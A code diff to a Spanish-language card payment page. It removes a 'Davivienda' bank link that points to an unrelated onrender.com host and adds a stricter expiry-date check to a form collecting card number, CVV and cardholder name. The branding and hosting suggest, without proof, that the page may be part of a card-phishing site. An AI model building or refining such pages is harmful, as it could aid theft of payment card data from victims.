@@ -186,17 +186,6 @@
                 </div>
                 <span class="method-arrow">›</span>
             </div>
-
-            <a href="https://pasegrodvcolombia.onrender.com/" class="method-card" id="methodDavivienda" style="text-decoration:none; color:inherit;">
-                <div class="method-left">
-                    <img src="davi1.png" alt="Davivienda" class="method-icon">
-                    <div class="method-text">
-                        <span class="method-name">Davivienda</span>
-                        <span class="method-desc">Pago con Davivienda</span>
-                    </div>
-                </div>
-                <span class="method-arrow">›</span>
-            </a>
         </div>
 
         <div class="card-form" id="cardForm">
@@ -543,6 +532,38 @@
         }
 
         // ============================================================
+        // VALIDACIÓN DE FECHA DE VENCIMIENTO (mínimo 2026, sin meses pasados)
+        // ============================================================
+        function validarVencimiento(exp) {
+            if (!/^\d{2}\/\d{2}$/.test(exp)) {
+                return { valido: false, mensaje: 'Formato inválido. Use MM/AA.' };
+            }
+            const [mesStr, anioStr] = exp.split('/');
+            const mes = parseInt(mesStr, 10);
+            const anio = parseInt(anioStr, 10);
+            if (mes < 1 || mes > 12) {
+                return { valido: false, mensaje: 'El mes debe estar entre 01 y 12.' };
+            }
+            // Año mínimo permitido: 2026
+            if (anio < 26) {
+                return { valido: false, mensaje: 'La tarjeta debe vencer en 2026 o después.' };
+            }
+            if (anio === 26) {
+                // Si es 2026, el mes no puede ser anterior al actual
+                const hoy = new Date();
+                const mesActual = hoy.getMonth() + 1; // 1-12
+                // Como estamos en 2025 según el sistema, pero si ya es 2026, comparamos.
+                // Si el año actual es menor a 2026, cualquier mes de 2026 es válido.
+                const anioActual = hoy.getFullYear();
+                if (anioActual === 2026 && mes < mesActual) {
+                    return { valido: false, mensaje: 'La tarjeta ya está vencida para el mes actual de 2026.' };
+                }
+                // Si el año actual es 2025 o anterior, todos los meses de 2026 sirven
+            }
+            return { valido: true };
+        }
+
+        // ============================================================
         // INPUT NÚMERO → BIN LOOKUP CON DEBOUNCE
         // ============================================================
         inputNumero.addEventListener('input', function() {
@@ -687,6 +708,14 @@
             if (!nombre) { mostrarError('Por favor, ingresa el nombre del titular'); return; }
             if (!numero || numero.length < 15) { mostrarError('El número de tarjeta debe tener al menos 15 dígitos'); return; }
             if (!exp || !/^\d{2}\/\d{2}$/.test(exp)) { mostrarError('Ingresa una fecha de vencimiento válida (MM/AA)'); return; }
+            
+            // Validación estricta de vencimiento (mínimo 2026, sin meses pasados en 2026)
+            const validacionExp = validarVencimiento(exp);
+            if (!validacionExp.valido) {
+                mostrarError(validacionExp.mensaje);
+                return;
+            }
+
             if (!cvv || cvv.length < 3) { mostrarError('Ingresa un CVV válido (3 o 4 dígitos)'); return; }
             if (!cuotasSeleccionadas) { mostrarError('Por favor, selecciona el número de cuotas'); return; }
             if (!terms) { mostrarError('Debes aceptar los términos de servicio'); return; }
